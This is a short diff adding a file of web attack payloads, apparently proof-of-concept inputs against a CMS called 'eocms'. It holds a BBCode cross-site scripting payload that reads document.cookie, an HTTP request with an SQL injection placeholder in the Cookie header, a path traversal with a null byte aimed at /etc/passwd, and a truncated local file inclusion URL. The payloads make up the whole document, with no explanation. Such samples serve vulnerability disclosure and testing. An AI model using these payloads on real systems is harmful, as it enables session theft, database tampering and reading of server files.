@@ -1,0 +1,8 @@
+[img][color=onerror=javascript:alert(document.cookie);"][/color][/img]
+
+GET /index.php HTTP/1.0
+Cookie: eocms='SQL_CODE_HERE
+
+http://www.example.com/index.php?theme=../../../../../../../../../../../../../../../etc/passwd%00
+
+http://www.example.com/index.php?lang=file
